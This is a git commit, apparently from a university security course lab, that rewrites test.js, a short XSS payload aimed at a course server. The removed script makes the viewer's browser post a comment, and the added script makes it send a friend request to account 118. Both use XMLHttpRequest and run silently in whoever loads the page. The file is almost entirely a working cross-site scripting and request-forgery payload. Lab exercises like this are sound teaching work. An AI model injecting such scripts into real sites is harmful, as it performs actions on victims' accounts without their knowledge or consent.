aa16d1ded12742ba4011cfc9c9b7635b6b0f5084
mjp2960 <55259226+mjp2960@users.noreply.github.com>
2021-12-15 15:43:24 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,11 +1,8 @@
-<script>
-	alert(1);
-	var addCommentEvidence = new XMLHttpRequest(); 
-	var date = new Date(); 
-	var url = 'http://csec380-core.csec.rit.edu:86/add_comment.php?id%3D118%26comment%3D'%2B date;
-	addCommentEvidence.open('POST', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=118&comment=hello2', true);
-	addCommentEvidence.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-
-	addCommentEvidence.send();
+<script> 
+	alert(2);
+	var addFriend = new XMLHttpRequest(); 
 	
-</script> 
+	addFriend.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=118', true);
+	addFriend.setRequestHeader('Content-type', 'application/x-www-form-urlendcoded'); 
+	addFriend.send();
+</script>
